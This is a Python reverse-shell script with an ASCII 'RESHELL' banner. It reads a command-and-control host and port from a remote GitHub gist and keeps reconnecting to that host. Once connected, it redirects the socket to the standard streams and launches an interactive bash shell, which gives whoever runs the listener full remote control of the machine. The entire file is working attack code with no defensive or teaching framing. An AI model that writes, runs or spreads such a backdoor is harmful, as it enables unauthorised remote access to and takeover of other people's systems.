#!/usr/bin/python3
import socket
import requests
from os import dup2
from time import sleep
from typing import Union
from subprocess import run

DEFAULT_HOST: str = 'localhost'
DEFAULT_PORT: int = 64839

def color_header() -> str:
    header: str = """
 ██▀███  ▓█████   ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▓██ ░▄█ ▒▒███   ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░██▓ ▒██▒░▒████▒▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░░   ░    ░   ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░        ░  ░      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
"""
    colors = {
        '\033[1;37;40m': ['█', '▀'],
        '\033[1;31;40m': ['▓', '░', '▒']
    }
    for color, chars in colors.items():
        for char in chars:
            header = header.replace(char, f"{color}{char}")
    return f'{header}\n'
        

class Config:

    host: str = DEFAULT_HOST
    port: int = DEFAULT_PORT

    def __init__(self) -> None:
        self.read_config()

    def read_config(self) -> None:
        try:
            __config_url: str = 'https://gist.github.com/sectasy0/0726be72fb8eee8d7da0f481989e5c81'
            with requests.get(f"{__config_url}/raw/config.txt") as __resp:
                self.host, self.port = __resp.text.split(';')
                self.port = int(self.port)
        except Exception as __e:
            return None


def connect(ip: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> socket.socket:
    __sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        __sock.connect((ip, port))
        return __sock
    except ConnectionRefusedError:
        return connect(ip, port)


def start_shell(sock: socket.socket) -> None:
    dup2(sock.fileno(), 0)
    dup2(sock.fileno(), 1)
    dup2(sock.fileno(), 2)
    run(['/bin/bash', '-i'])


if __name__ == '__main__':
    connected_socket: Union[socket.socket, None] = None
    config: Config = Config()
    while True:
        try:
            connected_socket = connect(config.host, config.port)
            connected_socket.send(color_header().encode())
            start_shell(connected_socket)
        except KeyboardInterrupt:
            if connected_socket:
                connected_socket.close()
            exit(0)

